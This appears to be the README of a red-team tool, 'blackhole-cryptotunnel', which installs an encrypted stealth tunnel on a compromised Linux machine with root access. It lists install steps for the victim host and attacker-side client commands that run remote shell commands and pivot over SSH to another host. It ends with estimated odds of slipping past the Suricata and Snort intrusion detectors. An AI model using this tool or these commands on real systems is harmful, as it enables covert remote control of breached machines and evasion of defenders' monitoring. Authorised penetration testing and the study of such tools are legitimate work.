# blackhole-cryptotunnel
Enhanced Stealth Tunnel for Linux (Red Team Ops on compromised machine with root)

# On compromised machine:
Copy and launch a file: 
crypto_tunnel.py & enhanced_stealth_tunnel.py in /opt/enhanced-stealth-tunnel 
cd /opt/enhanced-stealth-tunnel
python3 enhanced_stealth_tunnel.py --generate-config

# Editing enhanced_tunnel_config.json
python3 enhanced_stealth_tunnel.py -c enhanced_tunnel_config.json

or launch ./enhanced_install.sh

# 2. From the attacking machine:
launch a file:
python3 enhanced_client.py 192.168.1.50 -k tunnel.key --shell "whoami"
python3 enhanced_client.py 192.168.1.50 -k tunnel.key --ssh 198.51.100.10

# A realistic estimate of the probability of detection
Basic tunnel configuration:

    Suricata: ~35-45% probability of detection
    Snort: ~25-35% probability of detection
    Combined risk: ~55-65%
